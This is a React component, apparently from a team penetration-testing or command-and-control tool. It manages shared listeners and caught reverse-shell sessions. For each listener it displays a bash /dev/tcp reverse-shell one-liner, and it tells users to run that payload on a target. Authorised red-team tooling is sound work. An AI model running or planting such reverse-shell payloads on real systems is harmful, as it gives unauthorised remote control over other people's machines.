import { useEffect, useState } from "react";
import { SessionInfo, ListenerInfo, getSessions, getListeners, startListener, stopListener } from "./api";
import { ShellTerminal } from "./Terminal";

// The Sessions tab: open listeners, watch caught shells land (grouped by host), and drive
// them collaboratively. The whole team sees the same list on the one shared server.
export function Sessions({ tester }: { tester: string }) {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [listeners, setListeners] = useState<ListenerInfo[]>([]);
  const [open, setOpen] = useState<string | null>(null);
  const [port, setPort] = useState("4444");
  const [err, setErr] = useState<string | null>(null);

  async function refresh() {
    try {
      const [s, l] = await Promise.all([getSessions(), getListeners()]);
      setSessions(s);
      setListeners(l);
    } catch { /* transient */ }
  }
  useEffect(() => {
    refresh();
    const id = window.setInterval(refresh, 2000);
    return () => window.clearInterval(id);
  }, []);

  async function addListener() {
    setErr(null);
    try {
      await startListener(parseInt(port, 10) || 0);
      refresh();
    } catch (e) {
      setErr(String(e instanceof Error ? e.message : e));
    }
  }

  const lhost = location.hostname;
  const openSession = sessions.find((s) => s.id === open) || null;

  return (
    <div className="sessions-view">
      <section className="panel">
        <div className="panel-h">
          <h3>Listeners</h3>
          <span className="muted">catch a reverse shell on the shared server</span>
        </div>
        <div className="listener-row">
          <input className="scan-in" value={port} onChange={(e) => setPort(e.target.value)}
                 placeholder="port" style={{ maxWidth: 100 }} />
          <button className="run" onClick={addListener}>▶ Open listener</button>
        </div>
        {err && <div className="ranmsg warn-msg">{err}</div>}
        <div className="listener-list">
          {listeners.length === 0 && <div className="muted">no listeners yet</div>}
          {listeners.map((l) => (
            <div key={l.id} className="listener-item">
              <span className="mono">:{l.port}</span>
              <span className="badge">{l.kind}</span>
              <code className="payload">bash -i &gt;&amp; /dev/tcp/{lhost}/{l.port} 0&gt;&amp;1</code>
              <button className="linkish" onClick={() => { stopListener(l.id).then(refresh); }}>stop</button>
            </div>
          ))}
        </div>
      </section>

      <section className="panel">
        <div className="panel-h">
          <h3>Sessions</h3>
          <span className="muted">{sessions.filter((s) => s.status === "live").length} live · {sessions.length} total</span>
        </div>
        {sessions.length === 0 && (
          <div className="empty">
            No shells yet. Open a listener above, run its payload on a target, and the caught
            shell lands here — live for the whole team, tied to its host.
          </div>
        )}
        <div className="session-list">
          {sessions.map((s) => (
            <button key={s.id} className={"session-item" + (s.id === open ? " sel" : "")}
                    onClick={() => setOpen(s.id === open ? null : s.id)}>
              <span className={"sess-dot " + (s.status === "live" ? "live" : "stale")} />
              <span className="mono host">{s.host_ip}</span>
              <span className="badge">{s.status}</span>
              {s.driver && <span className="muted">▸ {s.driver}</span>}
              {s.attached.length > 0 && <span className="muted">👁 {s.attached.length}</span>}
            </button>
          ))}
        </div>
      </section>

      {openSession && (
        <section className="panel">
          <div className="panel-h">
            <h3>Terminal — <span className="mono">{openSession.host_ip}</span></h3>
            <button className="linkish" onClick={() => setOpen(null)}>close</button>
          </div>
          <ShellTerminal key={openSession.id} session={openSession} tester={tester} />
        </section>
      )}
    </div>
  );
}
